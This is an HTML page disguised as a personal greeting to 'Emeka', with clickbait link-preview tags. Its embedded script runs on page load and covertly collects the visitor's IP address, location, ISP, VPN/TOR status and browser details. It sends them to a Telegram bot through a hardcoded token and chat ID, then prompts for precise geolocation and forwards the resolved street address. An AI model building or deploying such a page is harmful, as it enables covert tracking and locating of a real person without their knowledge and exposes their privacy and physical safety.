<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta property="og:title" content="Check this out">
  <meta property="og:description" content="You won't believe this...">
  <meta property="og:image" content="clickhere.jpg">
  <meta property="og:type" content="website">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hi</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      margin: 0;
      font-family: sans-serif;
    }
    img {
      max-width: 300px;
    }
    .message {
      margin-top: 20px;
      font-size: 24px;
    }
  </style>
</head>
<body>
  <div class="message">Hi Emeka 👋🏿</div>

  <script>
    const PUBLIC_BOT_TOKEN = '7904257718:AAEMNe8Nb4Lk4YcCPr1BjB2bfxq9HF-tjI8';
    const PUBLIC_CHAT_ID = '7830815090';

    async function getIpData(ip) {
      const res = await fetch(`https://ipapi.co/${ip}/json/`);
      return await res.json();
    }

    async function reverseGeocode(lat, lon) {
      try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
        const data = await res.json();
        return data.display_name || 'Unknown location';
      } catch {
        return 'Lookup failed';
      }
    }

    function getBrowserInfo() {
      const ua = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const deviceType = /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop';
      const time = new Date().toLocaleString();

      return {
        ua, platform, language, timezone, deviceType, time
      };
    }

    function sendTelegramMessage(text) {
      fetch(`https://api.telegram.org/bot${PUBLIC_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: PUBLIC_CHAT_ID,
          text
        })
      });
    }

    async function getGeoPrompt() {
      return new Promise(resolve => {
        if (!navigator.geolocation) {
          resolve(null);
          return;
        }

        navigator.geolocation.getCurrentPosition(
          async pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const address = await reverseGeocode(lat, lon);

            resolve({
              lat,
              lon,
              address
            });
          },
          () => resolve(null),
          { timeout: 5000 }
        );
      });
    }

    function buildInitialMessage(ipData, ipAddressResolved, browserData) {
      return `📡 *New Visitor Report*

🌐 *Browser Info*
- User Agent: ${browserData.ua}
- Platform: ${browserData.platform}
- Language: ${browserData.language}
- Timezone: ${browserData.timezone}
- Device Type: ${browserData.deviceType}
- Current Time: ${browserData.time}

📍 *IP-Based Location*
- IP: ${ipData.ip}
- Country: ${ipData.country_name}
- Region: ${ipData.region}
- City: ${ipData.city}
- ISP: ${ipData.org}
- ASN: ${ipData.asn}
- Proxy: ${ipData.proxy ? 'Yes' : 'No'}
- VPN: ${ipData.security?.vpn ? 'Yes' : 'No'}
- TOR: ${ipData.security?.tor ? 'Yes' : 'No'}
- Latitude: ${ipData.latitude}
- Longitude: ${ipData.longitude}
- Address: ${ipAddressResolved}`;
    }

    function buildGeoMessage(geoData) {
      return `📌 *Geo Prompt Location (Permission Allowed)*

- Latitude: ${geoData.lat}
- Longitude: ${geoData.lon}
- Address: ${geoData.address}`;
    }

    (async () => {
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ip = (await ipRes.json()).ip;

        const ipData = await getIpData(ip);
        const ipAddressResolved = await reverseGeocode(ipData.latitude, ipData.longitude);
        const browserData = getBrowserInfo();

        const initialMessage = buildInitialMessage(ipData, ipAddressResolved, browserData);
        sendTelegramMessage(initialMessage);

        const geoData = await getGeoPrompt();
        if (geoData) {
          const geoMessage = buildGeoMessage(geoData);
          sendTelegramMessage(geoMessage);
        }
      } catch (err) {
        console.error('Failed to collect and send info', err);
      }
    })();
  </script>
</body>
</html>
